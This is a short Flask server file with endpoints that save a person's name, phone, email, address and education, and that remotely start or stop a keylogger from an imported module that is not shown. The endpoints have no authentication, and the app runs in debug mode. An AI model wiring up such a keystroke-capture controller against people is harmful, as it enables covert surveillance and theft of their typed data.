from flask import Flask, request, jsonify
from database import save_user_details, toggle_keylogger_status
from keylogger import start_keylogger, stop_keylogger

app = Flask(__name__)

@app.route('/saveDetails', methods=['POST'])
def save_details():
    user_details = request.json
    save_user_details(
        user_details['name'],
        user_details['mobile'],
        user_details['email'],
        user_details['address'],
        user_details['education']
    )
    return jsonify({"message": "User details saved successfully!"})

@app.route('/toggleKeylogger', methods=['POST'])
def toggle_keylogger():
    activate = request.json.get('activate')
    if activate:
        start_keylogger()
    else:
        stop_keylogger()
    toggle_keylogger_status(activate)
    return jsonify({"message": f"Keylogger {'activated' if activate else 'deactivated'} successfully."})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
